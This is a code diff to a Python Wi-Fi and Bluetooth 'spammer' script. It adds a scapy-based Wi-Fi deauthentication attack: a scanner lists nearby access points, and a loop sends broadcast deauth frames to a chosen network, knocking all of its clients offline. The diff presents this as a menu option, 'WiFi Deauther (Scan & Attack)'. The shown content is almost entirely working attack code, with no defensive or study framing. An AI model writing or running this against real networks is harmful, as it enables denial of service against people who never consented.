@@ -11,7 +11,7 @@ import time
 import random
 import subprocess
 import threading
-from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
+from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, Dot11Deauth, sniff
 
 # --- BLE Payloads ---
 APPLE_DEVICES = {
@@ -126,6 +126,7 @@ class WiFiSpammer:
         self.interface = interface
         self.is_spamming = False
         self.threads = []
+        self.discovered_aps = {}
 
     def set_monitor(self, enable=True):
         try:
@@ -134,6 +135,36 @@ class WiFiSpammer:
             subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
             return True
         except: return False
+
+    def scan_callback(self, pkt):
+        if pkt.haslayer(Dot11Beacon):
+            bssid = pkt[Dot11].addr2
+            try:
+                ssid = pkt[Dot11Elt].info.decode()
+            except:
+                ssid = "<Hidden SSID>"
+            if bssid not in self.discovered_aps:
+                self.discovered_aps[bssid] = ssid
+                print(f"  [{len(self.discovered_aps)}] {bssid} - {ssid}")
+
+    def scan_aps(self, timeout=10):
+        print(f"[*] Scanning for APs on {self.interface} (Timeout: {timeout}s)...")
+        print("  #   BSSID              SSID")
+        self.discovered_aps = {}
+        if self.set_monitor(True):
+            try:
+                sniff(iface=self.interface, prn=self.scan_callback, timeout=timeout)
+            except Exception as e:
+                print(f"[!] Scan error: {e}")
+            return self.discovered_aps
+        return {}
+
+    def deauth_task(self, target_bssid):
+        # Client MAC 'ff:ff:ff:ff:ff:ff' targets all clients on the AP
+        pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
+        print(f"[*] Sending deauth packets to {target_bssid}... (Ctrl+C to stop)")
+        while self.is_spamming:
+            sendp(pkt, iface=self.interface, count=100, inter=0.1, verbose=False)
 
     def create_beacon(self, ssid):
         mac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
@@ -148,7 +179,7 @@ class WiFiSpammer:
         while self.is_spamming:
             sendp(packets, iface=self.interface, verbose=False)
 
-    def start(self, ssids):
+    def start_spam(self, ssids):
         self.is_spamming = True
         if self.set_monitor(True):
             t = threading.Thread(target=self.spam_task, args=(ssids,), daemon=True)
@@ -157,9 +188,20 @@ class WiFiSpammer:
             return True
         return False
 
+    def start_deauth(self, target_bssid):
+        self.is_spamming = True
+        if self.set_monitor(True):
+            t = threading.Thread(target=self.deauth_task, args=(target_bssid,), daemon=True)
+            t.start()
+            self.threads.append(t)
+            return True
+        return False
+
     def stop(self):
         self.is_spamming = False
-        for t in self.threads: t.join()
+        for t in self.threads:
+            if t.is_alive():
+                t.join(timeout=1)
         self.threads = []
         self.set_monitor(False)
 
@@ -195,11 +237,12 @@ def main():
         sys.exit(0)
 
     # Menu
-    print("\n--- Spam Mode ---")
+    print("\n--- Mode Menu ---")
     print("1. BLE Only (Cycle All)")
     print("2. WiFi Only (Common SSIDs)")
     print("3. BOTH (BLE Cycle + WiFi Common)")
     print("4. Custom / Specific Selection")
+    print("5. WiFi Deauther (Scan & Attack)")
     print("0. Exit")
     
     choice = input("\nChoice: ")
@@ -211,10 +254,10 @@ def main():
         if choice == '1' and ble_spammer:
             ble_spammer.start(cycle=True)
         elif choice == '2' and wifi_spammer:
-            wifi_spammer.start(COMMON_SSIDS)
+            wifi_spammer.start_spam(COMMON_SSIDS)
         elif choice == '3':
             if ble_spammer: ble_spammer.start(cycle=True)
-            if wifi_spammer: wifi_spammer.start(COMMON_SSIDS)
+            if wifi_spammer: wifi_spammer.start_spam(COMMON_SSIDS)
         elif choice == '4':
             # Specific selection logic
             ble_payload = None
@@ -257,11 +300,25 @@ def main():
             if ble_spammer and (ble_payload or ble_cycle):
                 ble_spammer.start(payload=ble_payload, cycle=ble_cycle)
             if wifi_spammer and wifi_ssids:
-                wifi_spammer.start(wifi_ssids)
+                wifi_spammer.start_spam(wifi_ssids)
+
+        elif choice == '5' and wifi_spammer:
+            aps = wifi_spammer.scan_aps()
+            if aps:
+                try:
+                    target_idx = int(input("\nSelect target AP number: "))
+                    target_bssid = list(aps.keys())[target_idx - 1]
+                    wifi_spammer.start_deauth(target_bssid)
+                except (ValueError, IndexError):
+                    print("[!] Invalid selection.")
+                    sys.exit(1)
+            else:
+                print("[!] No APs found.")
+                sys.exit(0)
 
         elif choice == '0': sys.exit(0)
         
-        print("\n[*] Spamming active! Press Ctrl+C to stop.")
+        print("\n[*] Operation active! Press Ctrl+C to stop.")
         while True: time.sleep(1)
         
     except KeyboardInterrupt:
